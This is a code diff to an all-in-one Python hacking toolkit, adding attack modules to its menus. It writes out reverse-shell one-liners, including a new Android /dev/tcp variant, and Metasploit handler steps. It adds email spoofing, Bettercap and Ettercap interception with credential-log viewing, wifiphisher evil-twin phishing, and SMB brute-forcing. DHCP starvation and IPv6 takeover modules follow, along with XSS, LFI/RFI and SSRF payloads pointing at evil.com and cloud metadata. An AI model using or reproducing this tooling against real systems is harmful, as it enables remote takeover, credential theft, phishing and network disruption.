@@ -13,6 +13,7 @@ import threading
 import shutil
 from urllib.parse import urlparse
 import sys
+import re
 
 # Add color output utilities
 class Colors:
@@ -38,7 +39,6 @@ def typewriter(text, delay=0.01):
     for char in text:
         print(char, end='', flush=True)
         time.sleep(delay)
-    print()
 
 class Spinner:
     def __init__(self, message="Working..."):
@@ -64,6 +64,25 @@ class Spinner:
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
+
+def color_menu_numbers(menu_text):
+    # Replace numbers at the start of lines with blue colored numbers
+    return re.sub(r'^(\s*)(\d+)([.])', r'\1' + Colors.OKBLUE + r'\2\3' + Colors.ENDC, menu_text, flags=re.MULTILINE)
+
+def print_menu_with_header(menu_text):
+    clear_screen()
+    print(BANNER)
+    print(DISCLAIMER)
+    print(Colors.OKCYAN + "-"*60 + Colors.ENDC)
+    print(color_menu_numbers(menu_text))
+    print(Colors.OKCYAN + "-"*60 + Colors.ENDC)
+
+def print_menu_no_clear(menu_text):
+    print(BANNER)
+    print(DISCLAIMER)
+    print(Colors.OKCYAN + "-"*60 + Colors.ENDC)
+    print(color_menu_numbers(menu_text))
+    print(Colors.OKCYAN + "-"*60 + Colors.ENDC)
 
 BANNER = f"""
 {Colors.OKCYAN}
@@ -105,6 +124,24 @@ def ensure_installed(cmd_name, install_cmd):
         print(f"[!] {cmd_name} not found. Installing...")
         subprocess.run(["sudo", "apt", "install", "-y"] + install_cmd.split())
 
+def check_root():
+    if os.geteuid() != 0:
+        print("[!] This action requires root privileges. Please run as root or with sudo.")
+        return False
+    return True
+
+def check_monitor_mode(iface):
+    # Simple check for monitor mode
+    try:
+        output = subprocess.getoutput(f"iwconfig {iface}")
+        if "Mode:Monitor" not in output:
+            print(f"[!] Interface {iface} is not in monitor mode. Use: sudo airmon-ng start {iface}")
+            return False
+    except Exception:
+        print(f"[!] Could not check monitor mode for {iface}.")
+        return False
+    return True
+
 def auto_install_dependencies():
     # List of required tools
     tools = [
@@ -122,6 +159,9 @@ def auto_install_dependencies():
         ("reaver", "reaver"),
         ("hcxdumptool", "hcxdumptool"),
         ("hcxpcapngtool", "hcxtools"),
+        ("ettercap", "ettercap-text-only"),
+        ("wifiphisher", "wifiphisher"),
+        ("bettercap", "bettercap"),
     ]
     for cmd, pkg in tools:
         if shutil.which(cmd) is None:
@@ -181,8 +221,74 @@ def arp_scan():
 # Nmap Wrapper
 def nmap_scan(target):
     ensure_installed("nmap", "nmap")
+    def is_valid_ip(ip):
+        import re
+        return re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", ip) or re.match(r"^[a-zA-Z0-9.-]+$", ip)
+    if not is_valid_ip(target):
+        print("[-] Invalid target. Enter a valid IP address or hostname.")
+        return
     print(f"\n[+] Running Nmap scan on {target}")
-    options = input("Nmap options (default -A): ").strip() or "-A"
+    help_text = '''\nNmap Advanced Options Help:
+- Service/version:        -sV
+- OS detection:           -O
+- Stealth SYN scan:       -sS
+- UDP scan:               -sU
+- Aggressive:             -A
+- Top 1000 ports:         --top-ports 1000
+- All ports:              -p- 
+- NSE scripts:            --script=default,vuln
+- Custom script:          --script=/path/to/script.nse
+- Output to file:         -oN result.txt
+- Timing:                 -T4
+- Firewall evasion:       -f, --data-length, --source-port
+- Example:                -sS -A -T4 --script=default,vuln -oN scan.txt
+'''
+    presets = [
+        ("1. Quick scan (top 1000 ports)", "--top-ports 1000"),
+        ("2. Full TCP scan (all ports)", "-p-"),
+        ("3. Service/version detection", "-sV"),
+        ("4. OS detection", "-O"),
+        ("5. Aggressive scan (OS, version, script, traceroute)", "-A"),
+        ("6. Vulnerability scripts", "--script=vuln"),
+        ("7. Default scripts", "--script=default"),
+        ("8. Custom script", None),
+        ("9. Custom options (manual entry)", None),
+        ("h. Show help/examples", None),
+        ("0. Cancel", None)
+    ]
+    while True:
+        print("\nNmap Scan Presets:")
+        for label, _ in presets:
+            print(f"  {label}")
+        choice = input("Select preset or enter 'h' for help, '9' for custom options: ").strip()
+        if choice == "0":
+            return
+        elif choice == "h":
+            print(help_text)
+            continue
+        elif choice == "1":
+            options = "--top-ports 1000"
+        elif choice == "2":
+            options = "-p-"
+        elif choice == "3":
+            options = "-sV"
+        elif choice == "4":
+            options = "-O"
+        elif choice == "5":
+            options = "-A"
+        elif choice == "6":
+            options = "--script=vuln"
+        elif choice == "7":
+            options = "--script=default"
+        elif choice == "8":
+            script = input("Enter NSE script name or path (e.g. default,vuln or /path/to/script.nse): ").strip()
+            options = f"--script={script}"
+        elif choice == "9":
+            options = input("Enter full Nmap options (e.g. -sS -A -T4 --script=default,vuln): ").strip() or "-A"
+        else:
+            print("Invalid choice.")
+            continue
+        break
     spinner = Spinner("Scanning with Nmap")
     spinner.start()
     result = subprocess.run(["nmap"] + options.split() + [target], capture_output=True, text=True)
@@ -257,12 +363,26 @@ def spoof_email():
     body = input("Body: ")
     print("\n[!] This will attempt to send mail using your system's sendmail or configured relay.")
     message = f"Subject: {subject}\nFrom: {sender}\nTo: {recipient}\n\n{body}"
+    if shutil.which("sendmail") is None:
+        print("[-] sendmail not found. Install with: sudo apt install sendmail")
+        print("[!] Here is the raw email content. You can try sending it manually:")
+        print("\n--- RAW EMAIL ---\n" + message + "\n--- END ---\n")
+        return
     try:
-        subprocess.run(["sendmail", recipient], input=message.encode())
-        print("[+] Spoofed email sent.")
-        log_result("spoofmail", f"From: {sender} To: {recipient} Subject: {subject}")
+        result = subprocess.run(["sendmail", recipient], input=message.encode(), capture_output=True, text=True)
+        if result.returncode == 0:
+            print("[+] Spoofed email sent.")
+            log_result("spoofmail", f"From: {sender} To: {recipient} Subject: {subject}")
+        else:
+            print(f"[-] sendmail failed: {result.stderr}")
+            print("[!] Troubleshooting: Ensure sendmail is configured and your system allows local mail delivery.")
+            print("[!] Here is the raw email content. You can try sending it manually:")
+            print("\n--- RAW EMAIL ---\n" + message + "\n--- END ---\n")
     except Exception as e:
         print(f"[-] Failed to send email: {e}")
+        print("[!] Troubleshooting: Ensure sendmail is installed and configured. Try running 'sudo apt install sendmail'.")
+        print("[!] Here is the raw email content. You can try sending it manually:")
+        print("\n--- RAW EMAIL ---\n" + message + "\n--- END ---\n")
 
 # Phishing Page Generator (Static HTML)
 def phishing_page():
@@ -668,7 +788,8 @@ def generate_reverse_shell_payload():
     print("4. Perl")
     print("5. PHP")
     print("6. PowerShell (Windows)")
-    ptype = input("Payload type [1-6]: ").strip() or "1"
+    print("7. Android Bash (rooted/busybox)")
+    ptype = input("Payload type [1-7]: ").strip() or "1"
     if ptype == "2":
         payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
     elif ptype == "3":
@@ -679,6 +800,8 @@ def generate_reverse_shell_payload():
         payload = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
     elif ptype == "6":
         payload = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
+    elif ptype == "7":
+        payload = f"/system/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1"
     else:
         payload = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
     print("\n[+] Copy and run this on the target:")
@@ -689,6 +812,9 @@ def generate_reverse_shell_payload():
         with open(fname, "w") as f:
             f.write(payload + "\n")
         print(f"[+] Script saved as {fname}")
+    if ptype == "7":
+        print("[!] This payload works on rooted Androids with busybox or netcat support.")
+        print("[!] You may need to use /system/xbin/busybox sh or /system/xbin/nc depending on the device.")
 
 def generate_persistence_script():
     print("[!] Generate a Linux persistence script for a reverse shell.")
@@ -795,23 +921,95 @@ def generate_msfvenom_payload():
         print("[!] Embed the macro into a Word document and instruct the user to enable macros.")
     if ptype == "4":
         print("[!] APK payloads require installation and permissions on the target device.")
+        print("[!] To catch the session, use Metasploit multi/handler:")
+        print("    msfconsole")
+        print("    use exploit/multi/handler")
+        print("    set payload android/meterpreter/reverse_tcp")
+        print(f"    set LHOST {lhost}")
+        print(f"    set LPORT {lport}")
+        print("    run")
+
+def bettercap_menu():
+    menu_text = """
+[Bettercap MITM]
+1. Start Bettercap CLI (WiFi/Ethernet)
+2. Start Bettercap Web UI (remote control)
+3. Show Bettercap credential log
+0. Back
+"""
+    while True:
+        print_menu_no_clear(menu_text)
+        choice = input("[Bettercap] Select Option > ").strip()
+        if choice == "1":
+            ensure_installed("bettercap", "bettercap")
+            iface = input("Interface (e.g. wlan0mon or eth0): ").strip()
+            channel = input("WiFi Channel (optional, press Enter to skip): ").strip()
+            caplet = input("Bettercap caplet (e.g. wifi-ap, wifi-recon, press Enter for default): ").strip()
+            print("[!] To harvest credentials, use caplets like 'wifi-ap', 'http-req-dump', or 'net.sniff'.")
+            cmd = ["sudo", "bettercap", "-iface", iface]
+            if channel:
+                cmd += ["-eval", f"wifi.channel {channel}"]
+            if caplet:
+                cmd += ["-caplet", caplet]
+            print(f"[+] Running: {' '.join(cmd)}")
+            try:
+                subprocess.run(cmd)
+            except Exception as e:
+                print(f"[-] Bettercap failed: {e}")
+        elif choice == "2":
+            ensure_installed("bettercap", "bettercap")
+            iface = input("Interface (e.g. wlan0mon or eth0): ").strip()
+            print("[+] Launching Bettercap Web UI on http://127.0.0.1:8083 (default password: bettercap)")
+            print("[!] In your browser, go to http://127.0.0.1:8083 and login.")
+            print("[!] For remote access, forward port 8083 or use SSH tunneling.")
+            try:
+                subprocess.run(["sudo", "bettercap", "-iface", iface, "-caplet", "http-ui"])
+            except Exception as e:
+                print(f"[-] Bettercap Web UI failed: {e}")
+        elif choice == "3":
+            log_path = os.path.expanduser("~/.bettercap/logs/creds.log")
+            if os.path.exists(log_path):
+                print(f"[+] Showing credentials from {log_path}:")
+                with open(log_path) as f:
+                    print(f.read())
+            else:
+                print("[-] No Bettercap credential log found.")
+        elif choice == "0":
+            break
+        else:
+            print("Invalid option.")
 
 def mitm_menu():
-    print("""
+    menu_text = """
 [Advanced MITM Attacks]
 1. ARP Spoofing (arpspoof)
 2. HTTP/HTTPS Sniffing & Credential Harvesting (mitmproxy)
 3. DNS Spoofing (dnsspoof)
+4. Ettercap (CLI)
+5. Bettercap (Full MITM)
 0. Back
-""")
+"""
     while True:
+        print_menu_no_clear(menu_text)
         choice = input("[MITM] Select Option > ").strip()
         if choice == "1":
+            ensure_installed("arpspoof", "dsniff")
             arp_spoof()
         elif choice == "2":
+            ensure_installed("mitmproxy", "mitmproxy")
             http_sniff_and_harvest()
         elif choice == "3":
+            ensure_installed("dnsspoof", "dsniff")
             dns_spoof()
+        elif choice == "4":
+            ensure_installed("ettercap", "ettercap-text-only")
+            print("[+] Launching Ettercap CLI. For GUI, run 'sudo ettercap -G' in a separate terminal.")
+            try:
+                subprocess.run(["sudo", "ettercap", "-T", "-q", "-i", input("Interface (e.g. eth0): ").strip()])
+            except Exception as e:
+                print(f"[-] Ettercap failed: {e}")
+        elif choice == "5":
+            bettercap_menu()
         elif choice == "0":
             break
         else:
@@ -893,21 +1091,53 @@ def dns_spoof():
         print(f"[-] dnsspoof failed: {e}")
 
 def wifi_mitm_menu():
-    while True:
-        print("""
+    menu_text = """
 [WiFi MITM Attacks]
 1. Evil Twin AP (airbase-ng)
 2. Deauth + Rogue AP (airbase-ng + deauth)
 3. Automated Phishing Portal (wifiphisher)
+4. Ettercap (GUI)
+5. Bettercap (Full WiFi MITM)
 0. Back
-""")
+"""
+    while True:
+        print_menu_no_clear(menu_text)
         choice = input("[WiFi MITM] Select Option > ").strip()
         if choice == "1":
+            ensure_installed("airbase-ng", "aircrack-ng")
+            iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
+            if not check_monitor_mode(iface):
+                continue
             evil_twin_ap()
         elif choice == "2":
+            ensure_installed("airbase-ng", "aircrack-ng")
+            iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
+            if not check_monitor_mode(iface):
+                continue
             deauth_rogue_ap()
         elif choice == "3":
-            wifiphisher_attack()
+            if shutil.which("wifiphisher") is None:
+                print("[-] wifiphisher not found. Install with: sudo apt install wifiphisher")
+                continue
+            if not check_root():
+                continue
+            iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
+            if not check_monitor_mode(iface):
+                continue
+            print("[!] Troubleshooting: If wifiphisher fails, ensure your interface supports monitor mode and is not blocked by rfkill.")
+            try:
+                subprocess.run(["sudo", "wifiphisher", "-i", iface])
+            except Exception as e:
+                print(f"[-] wifiphisher failed: {e}")
+        elif choice == "4":
+            ensure_installed("ettercap", "ettercap-graphical")
+            print("[+] Launching Ettercap GUI...")
+            try:
+                subprocess.run(["sudo", "ettercap", "-G"])
+            except Exception as e:
+                print(f"[-] Ettercap GUI failed: {e}")
+        elif choice == "5":
+            bettercap_menu()
         elif choice == "0":
             break
         else:
@@ -967,7 +1197,7 @@ def wifiphisher_attack():
         print(f"[-] wifiphisher failed: {e}")
 
 def osint_menu():
-    print("""
+    menu_text = """
 [OSINT Toolkit]
 1. Username/Email Enumeration (Sherlock)
 2. Social Media Profile Search
@@ -976,8 +1206,9 @@ def osint_menu():
 5. OSINT Wordlist Generator
 6. Generate OSINT Report
 0. Back
-""")
+"""
     while True:
+        print_menu_no_clear(menu_text)
         choice = input("[OSINT] Select Option > ").strip()
         if choice == "1":
             sherlock_enum()
@@ -1084,6 +1315,423 @@ def osint_report():
         f.write("\n".join(report))
     print(f"[+] OSINT report saved as {fname}")
 
+def advanced_xss_test():
+    print("""
+[Advanced XSS Testing]
+- This module will test a target URL for reflected/stored XSS vulnerabilities.
+- You can use automated tools (XSStrike, commix) if installed, or run basic payload tests.
+""")
+    url = input("Target URL (e.g. http://site.com/page?param=val): ").strip()
+    if not url:
+        print("[-] No URL provided.")
+        return
+    # Try XSStrike first
+    if shutil.which("xsstrike"):
+        print("[+] Running XSStrike...")
+        try:
+            subprocess.run(["xsstrike", "-u", url])
+            log_result("xss", f"XSStrike scan: {url}")
+            return
+        except Exception as e:
+            print(f"[-] XSStrike failed: {e}")
+    # Try commix if available
+    if shutil.which("commix"):
+        print("[+] Running commix (for XSS and command injection)...")
+        try:
+            subprocess.run(["commix", "--url", url])
+            log_result("xss", f"commix scan: {url}")
+            return
+        except Exception as e:
+            print(f"[-] commix failed: {e}")
+    # Fallback: simple reflected XSS test
+    print("[!] Neither XSStrike nor commix found. Running basic reflected XSS test.")
+    import requests
+    payloads = [
+        "<script>alert(1)</script>",
+        "\"'><img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>"
+    ]
+    found = False
+    for payload in payloads:
+        test_url = url.replace("=", f"={payload}", 1)
+        try:
+            r = requests.get(test_url, timeout=10)
+            if payload in r.text:
+                print(f"[VULN] Payload reflected: {payload}")
+                log_result("xss", f"{test_url} reflected {payload}")
+                found = True
+        except Exception as e:
+            print(f"[-] Error testing payload: {payload} | {e}")
+    if not found:
+        print("[!] No reflected XSS found with basic payloads.")
+
+def advanced_lfi_rfi_test():
+    print("""
+[Advanced LFI/RFI Testing]
+- This module will test a target URL/parameter for Local/Remote File Inclusion vulnerabilities.
+- If LFISuite is installed, it will be used. Otherwise, basic payloads will be tested.
+""")
+    url = input("Target URL (e.g. http://site.com/page.php?file=home): ").strip()
+    if not url or '=' not in url:
+        print("[-] Please provide a URL with a parameter (e.g. ...?file=home)")
+        return
+    # Try LFISuite if available
+    if shutil.which("lfi-suite"):
+        print("[+] Running LFISuite...")
+        try:
+            subprocess.run(["lfi-suite", "-u", url])
+            log_result("lfi", f"LFISuite scan: {url}")
+            return
+        except Exception as e:
+            print(f"[-] LFISuite failed: {e}")
+    # Fallback: basic LFI payloads
+    print("[!] LFISuite not found. Running basic LFI/RFI payload tests.")
+    import requests
+    payloads = [
+        "../../../../../../etc/passwd",
+        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+        "php://filter/convert.base64-encode/resource=index.php",
+        "http://evil.com/shell.txt"
+    ]
+    found = False
+    for payload in payloads:
+        test_url = url.replace("=", f"={payload}", 1)
+        try:
+            r = requests.get(test_url, timeout=10)
+            if "root:x:" in r.text or "cGFzc3dk" in r.text or "hacked" in r.text:
+                print(f"[VULN] LFI/RFI payload worked: {payload}")
+                log_result("lfi", f"{test_url} reflected {payload}")
+                found = True
+        except Exception as e:
+            print(f"[-] Error testing payload: {payload} | {e}")
+    if not found:
+        print("[!] No LFI/RFI found with basic payloads.")
+
+def advanced_csrf_test():
+    print("""
+[Advanced CSRF Testing]
+- This module will test a target URL for CSRF vulnerabilities.
+- It checks for missing/weak CSRF tokens and can use OWASP ZAP or XSStrike if installed.
+""")
+    url = input("Target URL (e.g. http://site.com/form): ").strip()
+    if not url:
+        print("[-] No URL provided.")
+        return
+    # Try OWASP ZAP if available
+    if shutil.which("zap.sh"):
+        print("[+] Launching OWASP ZAP for automated CSRF scan...")
+        try:
+            subprocess.run(["zap.sh", "-cmd", "-quickurl", url, "-quickout", "zap_csrf_report.html", "-quickprogress"])
+            print("[+] ZAP scan complete. See zap_csrf_report.html for details.")
+            log_result("csrf", f"ZAP scan: {url}")
+            return
+        except Exception as e:
+            print(f"[-] ZAP failed: {e}")
+    # Try XSStrike if available
+    if shutil.which("xsstrike"):
+        print("[+] Running XSStrike for CSRF checks...")
+        try:
+            subprocess.run(["xsstrike", "-u", url, "--fuzzer", "csrf"])
+            log_result("csrf", f"XSStrike CSRF scan: {url}")
+            return
+        except Exception as e:
+            print(f"[-] XSStrike failed: {e}")
+    # Fallback: basic CSRF token check
+    print("[!] Neither ZAP nor XSStrike found. Running basic CSRF token check.")
+    import requests
+    try:
+        r = requests.get(url, timeout=10)
+        if any(token in r.text.lower() for token in ["csrf", "xsrf", "token"]):
+            print("[+] CSRF token found in form. (Check for proper implementation)")
+            log_result("csrf", f"{url} - token found")
+        else:
+            print("[VULN] No CSRF token found in form!")
+            log_result("csrf", f"{url} - no token found")
+    except Exception as e:
+        print(f"[-] Error fetching form: {e}")
+
+def advanced_web_vuln_scan():
+    print("""
+[Advanced Web Vulnerability Scanner]
+- This module will scan a target web application for common vulnerabilities.
+- Nikto and OWASP ZAP will be used if available.
+""")
+    url = input("Target URL (e.g. http://site.com): ").strip()
+    if not url:
+        print("[-] No URL provided.")
+        return
+    ran = False
+    # Try Nikto
+    if shutil.which("nikto"):
+        print("[+] Running Nikto web scanner...")
+        try:
+            subprocess.run(["nikto", "-h", url])
+            log_result("webscan", f"Nikto scan: {url}")
+            ran = True
+        except Exception as e:
+            print(f"[-] Nikto failed: {e}")
+    # Try OWASP ZAP
+    if shutil.which("zap.sh"):
+        print("[+] Launching OWASP ZAP for automated scan...")
+        try:
+            subprocess.run(["zap.sh", "-cmd", "-quickurl", url, "-quickout", "zap_webscan_report.html", "-quickprogress"])
+            print("[+] ZAP scan complete. See zap_webscan_report.html for details.")
+            log_result("webscan", f"ZAP scan: {url}")
+            ran = True
+        except Exception as e:
+            print(f"[-] ZAP failed: {e}")
+    if not ran:
+        print("[!] Neither Nikto nor ZAP found. Please install at least one for automated web scanning.")
+        print("[!] Nikto: sudo apt install nikto | ZAP: https://www.zaproxy.org/download/")
+
+def advanced_ssrf_test():
+    print("""
+[Advanced SSRF Testing]
+- This module will test a target URL/parameter for Server-Side Request Forgery vulnerabilities.
+- If SSRFmap is installed, it will be used. Otherwise, basic payloads will be tested.
+""")
+    url = input("Target URL (e.g. http://site.com/page?url=...): ").strip()
+    if not url or '=' not in url:
+        print("[-] Please provide a URL with a parameter (e.g. ...?url=...)")
+        return
+    # Try SSRFmap if available
+    if shutil.which("ssrfmap"):
+        print("[+] Running SSRFmap...")
+        try:
+            subprocess.run(["ssrfmap", "-u", url])
+            log_result("ssrf", f"SSRFmap scan: {url}")
+            return
+        except Exception as e:
+            print(f"[-] SSRFmap failed: {e}")
+    # Fallback: basic SSRF payloads
+    print("[!] SSRFmap not found. Running basic SSRF payload tests.")
+    import requests
+    payloads = [
+        "http://127.0.0.1/",
+        "http://localhost/",
+        "http://169.254.169.254/latest/meta-data/",
+        "file:///etc/passwd",
+        "http://evil.com/ssrf"
+    ]
+    found = False
+    for payload in payloads:
+        test_url = url.replace("=", f"={payload}", 1)
+        try:
+            r = requests.get(test_url, timeout=10)
+            if any(x in r.text for x in ["root:x:", "meta-data", "ssrf"]):
+                print(f"[VULN] SSRF payload worked: {payload}")
+                log_result("ssrf", f"{test_url} reflected {payload}")
+                found = True
+        except Exception as e:
+            print(f"[-] Error testing payload: {payload} | {e}")
+    if not found:
+        print("[!] No SSRF found with basic payloads.")
+
+def advanced_smb_bruteforce():
+    print("""
+[Advanced SMB/NTLM/LDAP Brute-force]
+- This module will brute-force SMB/NTLM/LDAP logins on a target.
+- CrackMapExec or Medusa will be used if available.
+""")
+    target = input("Target IP/hostname: ").strip()
+    username = input("Username (or path to userlist): ").strip()
+    wordlist = input("Password wordlist (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
+    if not target or not username or not wordlist:
+        print("[-] Please provide all required fields.")
+        return
+    ran = False
+    # Try CrackMapExec
+    if shutil.which("crackmapexec"):
+        print("[+] Running CrackMapExec (SMB)...")
+        try:
+            subprocess.run(["crackmapexec", "smb", target, "-u", username, "-p", wordlist])
+            log_result("smb_brute", f"CME SMB: {target} {username} {wordlist}")
+            ran = True
+        except Exception as e:
+            print(f"[-] CrackMapExec failed: {e}")
+    # Try Medusa
+    if shutil.which("medusa"):
+        print("[+] Running Medusa (SMB)...")
+        try:
+            subprocess.run(["medusa", "-h", target, "-u", username, "-P", wordlist, "-M", "smbnt"])
+            log_result("smb_brute", f"Medusa SMB: {target} {username} {wordlist}")
+            ran = True
+        except Exception as e:
+            print(f"[-] Medusa failed: {e}")
+    if not ran:
+        print("[!] Neither CrackMapExec nor Medusa found. Please install at least one for SMB brute-force.")
+        print("[!] CrackMapExec: pip install crackmapexec | Medusa: sudo apt install medusa")
+
+def advanced_hashdump_crack():
+    print("""
+[Advanced Hashdump & Offline Password Cracking]
+- This module will attempt to crack password hashes using John the Ripper or Hashcat.
+- You must provide a file containing hashes (e.g. /etc/shadow, NTLM, etc.).
+""")
+    hashfile = input("Path to hash file: ").strip()
+    if not hashfile or not os.path.exists(hashfile):
+        print("[-] Hash file not found.")
+        return
+    wordlist = input("Wordlist (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
+    ran = False
+    # Try John the Ripper
+    if shutil.which("john"):
+        print("[+] Running John the Ripper...")
+        try:
+            subprocess.run(["john", "--wordlist", wordlist, hashfile])
+            subprocess.run(["john", "--show", hashfile])
+            log_result("hashcrack", f"John: {hashfile} {wordlist}")
+            ran = True
+        except Exception as e:
+            print(f"[-] John failed: {e}")
+    # Try Hashcat
+    if shutil.which("hashcat"):
+        print("[+] Running Hashcat...")
+        hashmode = input("Hashcat mode (e.g. 0 for MD5, 1000 for NTLM, 1800 for sha512crypt, see --help): ").strip()
+        if not hashmode:
+            print("[-] No hash mode provided for Hashcat.")
+        else:
+            try:
+                subprocess.run(["hashcat", "-m", hashmode, hashfile, wordlist, "--force"])
+                log_result("hashcrack", f"Hashcat: {hashfile} {wordlist} mode {hashmode}")
+                ran = True
+            except Exception as e:
+                print(f"[-] Hashcat failed: {e}")
+    if not ran:
+        print("[!] Neither John the Ripper nor Hashcat found. Please install at least one for hash cracking.")
+        print("[!] John: sudo apt install john | Hashcat: sudo apt install hashcat")
+
+def advanced_dhcp_attack():
+    print("""
+[Advanced DHCP Starvation/Poisoning]
+- This module will perform DHCP starvation or poisoning attacks on the local network.
+- Yersinia or dhcpstarv will be used if available.
+""")
+    print("1. DHCP Starvation (exhaust IP pool)")
+    print("2. DHCP Poisoning (rogue server)")
+    print("0. Cancel")
+    choice = input("Select attack type: ").strip()
+    if choice == "0":
+        return
+    ran = False
+    if choice == "1":
+        # Try dhcpstarv
+        if shutil.which("dhcpstarv"):
+            print("[+] Running dhcpstarv for DHCP starvation...")
+            try:
+                subprocess.run(["dhcpstarv"])
+                log_result("dhcp", "dhcpstarv starvation attack")
+                ran = True
+            except Exception as e:
+                print(f"[-] dhcpstarv failed: {e}")
+        # Try Yersinia
+        elif shutil.which("yersinia"):
+            print("[+] Running Yersinia (GUI, select DHCP module)...")
+            try:
+                subprocess.run(["yersinia", "-G"])
+                log_result("dhcp", "Yersinia starvation attack")
+                ran = True
+            except Exception as e:
+                print(f"[-] Yersinia failed: {e}")
+    elif choice == "2":
+        # Try Yersinia
+        if shutil.which("yersinia"):
+            print("[+] Running Yersinia (GUI, select DHCP module for poisoning)...")
+            try:
+                subprocess.run(["yersinia", "-G"])
+                log_result("dhcp", "Yersinia poisoning attack")
+                ran = True
+            except Exception as e:
+                print(f"[-] Yersinia failed: {e}")
+        else:
+            print("[-] No supported tool found for DHCP poisoning. Install Yersinia.")
+    else:
+        print("Invalid choice.")
+    if not ran:
+        print("[!] Neither Yersinia nor dhcpstarv found. Please install at least one for DHCP attacks.")
+        print("[!] Yersinia: sudo apt install yersinia | dhcpstarv: https://github.com/kleo/dhcpstarv")
+
+def advanced_snmp_enum():
+    print("""
+[Advanced SNMP Enumeration]
+- This module will enumerate SNMP information from a target device.
+- snmpwalk and onesixtyone will be used if available.
+""")
+    target = input("Target IP/hostname: ").strip()
+    community = input("Community string (default 'public'): ").strip() or "public"
+    if not target:
+        print("[-] No target provided.")
+        return
+    ran = False
+    # Try snmpwalk
+    if shutil.which("snmpwalk"):
+        print(f"[+] Running snmpwalk on {target} with community '{community}'...")
+        try:
+            subprocess.run(["snmpwalk", "-v2c", "-c", community, target])
+            log_result("snmp_enum", f"snmpwalk: {target} {community}")
+            ran = True
+        except Exception as e:
+            print(f"[-] snmpwalk failed: {e}")
+    # Try onesixtyone
+    if shutil.which("onesixtyone"):
+        print(f"[+] Running onesixtyone on {target} with community '{community}'...")
+        try:
+            subprocess.run(["onesixtyone", "-c", community, target])
+            log_result("snmp_enum", f"onesixtyone: {target} {community}")
+            ran = True
+        except Exception as e:
+            print(f"[-] onesixtyone failed: {e}")
+    if not ran:
+        print("[!] Neither snmpwalk nor onesixtyone found. Please install at least one for SNMP enumeration.")
+        print("[!] snmpwalk: sudo apt install snmp | onesixtyone: sudo apt install onesixtyone")
+
+def advanced_ipv6_attacks():
+    print("""
+[Advanced IPv6 Attacks]
+- This module will perform common IPv6 network attacks (RA spoofing, MITM6, etc.).
+- mitm6 and THC-IPv6 tools will be used if available.
+""")
+    print("1. MITM6 (Windows IPv6 takeover)")
+    print("2. THC-IPv6 Toolkit (choose attack)")
+    print("0. Cancel")
+    choice = input("Select attack type: ").strip()
+    if choice == "0":
+        return
+    ran = False
+    if choice == "1":
+        if shutil.which("mitm6"):
+            print("[+] Running mitm6 (requires root)...")
+            try:
+                subprocess.run(["sudo", "mitm6"])
+                log_result("ipv6", "mitm6 attack")
+                ran = True
+            except Exception as e:
+                print(f"[-] mitm6 failed: {e}")
+        else:
+            print("[-] mitm6 not found. Install with: pip install mitm6")
+    elif choice == "2":
+        if shutil.which("fake_router6"):
+            print("[+] THC-IPv6 toolkit found. Example: fake_router6 eth0")
+            iface = input("Interface (e.g. eth0): ").strip()
+            if iface:
+                try:
+                    subprocess.run(["sudo", "fake_router6", iface])
+                    log_result("ipv6", f"THC-IPv6 fake_router6 {iface}")
+                    ran = True
+                except Exception as e:
+                    print(f"[-] fake_router6 failed: {e}")
+            else:
+                print("[-] No interface provided.")
+        else:
+            print("[-] THC-IPv6 tools not found. Install with: sudo apt install thc-ipv6")
+    else:
+        print("Invalid choice.")
+    if not ran:
+        print("[!] No supported IPv6 attack tool found. Please install mitm6 or THC-IPv6.")
+        print("[!] mitm6: pip install mitm6 | THC-IPv6: sudo apt install thc-ipv6")
+
+# --- END ADVANCED ATTACK MODULES ---
+
 # Split menu into core and advanced
 core_menus = [
     [
@@ -1112,54 +1760,115 @@ core_menus = [
         ("18. OSINT Wordlist Generator", osint_wordlist_generator),
         ("19. WiFi Network Scan", wifi_scan),
         ("20. Capture WPA Handshake", wifi_handshake_capture),
+        ("21. Advanced XSS Testing", advanced_xss_test),
+        ("22. Advanced LFI/RFI Testing", advanced_lfi_rfi_test),
+        ("23. Advanced CSRF Testing", advanced_csrf_test),
+        ("24. Advanced Web Vulnerability Scanner", advanced_web_vuln_scan),
+        ("25. Advanced SSRF Testing", advanced_ssrf_test),
+        ("26. Advanced SMB/NTLM/LDAP Brute-force", advanced_smb_bruteforce),
+        ("27. Advanced Hashdump & Offline Password Cracking", advanced_hashdump_crack),
+        ("28. Advanced DHCP Starvation/Poisoning", advanced_dhcp_attack),
+        ("29. Advanced SNMP Enumeration", advanced_snmp_enum),
+        ("30. Advanced IPv6 Attacks", advanced_ipv6_attacks),
         ("99. Next Page", None),
         ("0. Back", None)
     ],
     [
-        ("21. Crack WPA Handshake", wifi_crack_handshake),
-        ("22. Automated WiFi Attack (Wifite)", wifi_wifite),
-        ("23. Reverse Shell (TCP)", reverse_shell),
-        ("24. Generate Reverse Shell Payload", generate_reverse_shell_payload),
-        ("25. Start Listener (Netcat)", start_listener),
-        ("26. Generate Persistence Script", generate_persistence_script),
